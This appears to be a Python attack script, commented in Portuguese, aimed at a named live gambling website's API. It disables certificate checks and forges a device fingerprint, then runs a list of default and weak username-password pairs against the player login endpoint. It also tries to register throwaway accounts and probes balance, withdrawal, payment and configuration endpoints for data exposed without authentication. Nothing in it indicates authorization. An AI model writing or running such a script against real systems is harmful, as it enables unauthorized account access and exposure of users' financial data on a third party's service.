"""
Testa o login com deviceId gerado e explora os demais endpoints.
O sistema exige: appPackageName + deviceId (fingerprint)
"""
import urllib.request, ssl, json, hashlib, uuid, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def post(url, data, token=None):
    body = json.dumps(data).encode()
    h = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
    }
    if token:
        h["Authorization"] = f"Bearer {token}"
        h["token"] = token
    try:
        r = urllib.request.Request(url, data=body, headers=h, method="POST")
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            raw = resp.read(8192).decode("utf-8", "ignore")
            return resp.status, dict(resp.headers), raw
    except urllib.error.HTTPError as e:
        raw = e.read(4096).decode("utf-8", "ignore")
        return e.code, {}, raw
    except Exception as ex:
        return 0, {}, str(ex)

def get(url, token=None):
    h = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json",
    }
    if token:
        h["Authorization"] = f"Bearer {token}"
        h["token"] = token
    try:
        r = urllib.request.Request(url, headers=h)
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            raw = resp.read(8192).decode("utf-8", "ignore")
            return resp.status, dict(resp.headers), raw
    except urllib.error.HTTPError as e:
        raw = e.read(2048).decode("utf-8", "ignore")
        return e.code, {}, raw
    except Exception as ex:
        return 0, {}, str(ex)

BASE = "https://ds.amizade777.com"

# Gerar deviceId como o frontend faz (fingerprint do browser)
# O sistema usa finger_1.0.0.js para gerar um hash do dispositivo
# Simulamos com UUID fixo (como faria um bot/script)
DEVICE_ID = str(uuid.uuid4()).replace("-", "")[:32]
print(f"DeviceId simulado: {DEVICE_ID}")

def payload_login(phone, password, device_id=DEVICE_ID):
    return {
        "appChannel": "pc",
        "appPackageName": "com.slots.big",
        "deviceId": device_id,
        "deviceModel": "WEB",
        "deviceVersion": "WEB",
        "appVersion": "1.0.0",
        "sysTimezone": "-180",
        "sysLanguage": "pt-BR",
        "phone": phone,
        "password": password,
    }

print("="*60)
print("1. TESTANDO LOGIN COM CREDENCIAIS PADRÃO")
print("="*60)

testes = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "admin@123"),
    ("test",  "test123"),
    ("13800000000", "123456"),
    ("admin", ""),
    ("admin", "Admin@123"),
    ("admin", "Aa123456"),
    ("admin", "qwerty"),
    ("admin", "0000"),
    ("admin", "1234"),
    ("admin", "1111"),
    ("admin", "test"),
]

token_encontrado = None

for phone, pwd in testes:
    st, headers, body = post(BASE + "/prod-api/player/sign-in", payload_login(phone, pwd))
    try:
        j = json.loads(body)
        code = j.get("code")
        msg  = j.get("msg", "")
        print(f"  phone={phone!r} pwd={pwd!r} -> code={code} msg={msg!r}")
        # Sucesso real
        if code == 200 or "token" in str(j).lower():
            print("  *** LOGIN BEM-SUCEDIDO! ***")
            print(f"  {json.dumps(j, ensure_ascii=False)[:500]}")
            token_encontrado = j.get("data", {}).get("token") or j.get("token")
    except:
        print(f"  [{st}] phone={phone!r} -> {body[:100]}")

print("\n\n" + "="*60)
print("2. REGISTRO DE CONTA DE TESTE")
print("="*60)

# Tentar criar uma conta para obter token válido
registro_endpoints = [
    "/prod-api/player/register",
    "/prod-api/player/sign-up",
    "/prod-api/user/register",
    "/prod-api/register",
]

payload_registro = {
    "appChannel": "pc",
    "appPackageName": "com.slots.big",
    "deviceId": DEVICE_ID,
    "deviceModel": "WEB",
    "deviceVersion": "WEB",
    "appVersion": "1.0.0",
    "phone": f"test{int(time.time()) % 10000:04d}",
    "password": "Test@12345",
    "confirmPassword": "Test@12345",
    "inviteCode": "",
    "captcha": "",
}

for ep in registro_endpoints:
    st, _, body = post(BASE + ep, payload_registro)
    if st != 404:
        try:
            j = json.loads(body)
            print(f"  [{st}] {ep} -> code={j.get('code')} msg={j.get('msg','')!r}")
            if j.get("code") == 200:
                print("  *** CONTA CRIADA! ***")
                print(f"  {json.dumps(j, ensure_ascii=False)[:300]}")
                token_encontrado = j.get("data", {}).get("token")
        except:
            print(f"  [{st}] {ep} -> {body[:100]}")

print("\n\n" + "="*60)
print("3. OUTROS ENDPOINTS DA API (com e sem token)")
print("="*60)

# Endpoints descobertos no bundle + tentativas adicionais
endpoints_get = [
    "/prod-api/player/info",
    "/prod-api/player/balance",
    "/prod-api/vip/info",
    "/prod-api/letters",
    "/prod-api/otp/ping",
    "/prod-api/system/config",
    "/prod-api/system/info",
    "/prod-api/app/version",
    "/prod-api/game/list",
    "/prod-api/activity/list",
    "/prod-api/bank/list",
    "/prod-api/finance/recharge/list",
    "/prod-api/finance/withdraw/list",
    "/prod-api/invite/info",
]

for ep in endpoints_get:
    st, _, body = get(BASE + ep, token=token_encontrado)
    if st not in (0, 404, 405):
        try:
            j = json.loads(body)
            print(f"  [GET {st}] {ep} -> code={j.get('code')} msg={j.get('msg','')!r}")
        except:
            print(f"  [GET {st}] {ep} -> {body[:80]}")

# Verificar se /prod-api/user sem token vaza info
print("\n\n" + "="*60)
print("4. VAZAMENTO DE INFORMAÇÃO SEM AUTENTICAÇÃO")
print("="*60)
endpoints_publicos = [
    "/prod-api/system/config",
    "/prod-api/app/config",
    "/prod-api/game/list",
    "/prod-api/activity",
    "/prod-api/notice",
    "/prod-api/announcement",
    "/prod-api/customer/service",
    "/prod-api/payment/channel",
    "/prod-api/recharge/config",
]
for ep in endpoints_publicos:
    st, _, body = get(BASE + ep)
    if st not in (0, 404):
        try:
            j = json.loads(body)
            print(f"  [GET {st}] {ep} -> code={j.get('code')} {json.dumps(j, ensure_ascii=False)[:150]}")
        except:
            print(f"  [GET {st}] {ep} -> {body[:100]}")
